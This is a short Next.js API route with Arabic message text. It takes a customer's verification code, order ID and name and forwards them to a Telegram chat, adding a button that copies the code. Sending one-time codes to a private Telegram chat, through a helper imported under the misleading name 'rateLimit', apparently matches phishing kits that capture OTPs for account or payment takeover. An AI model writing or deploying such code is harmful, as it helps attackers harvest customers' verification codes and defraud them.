import { NextRequest, NextResponse } from "next/server";
import { sendToTelegram } from "../../lib/rateLimit";

export async function POST(req: NextRequest) {

  const { code, orderId, customerName, customerId } = await req.json();

  const text = [
    `🔐  *كود تحقق جديد*`,
    `🏢  مؤسسة برج المبدع`,
    `━━━━━━━━━━━━━━━━`,
    ``,
    `🆔  رقم الطلب:  *${orderId ?? "—"}*`,
    `👤  العميل:  *${customerName ?? "—"}*`,
    `📟  الكود:  *${code}*`,
    ``,
    `━━━━━━━━━━━━━━━━`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: code } }]],
  };

  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup, parse_mode: "Markdown" });

  return NextResponse.json({ ok: sent }, { status: sent ? 200 : 502 });
}
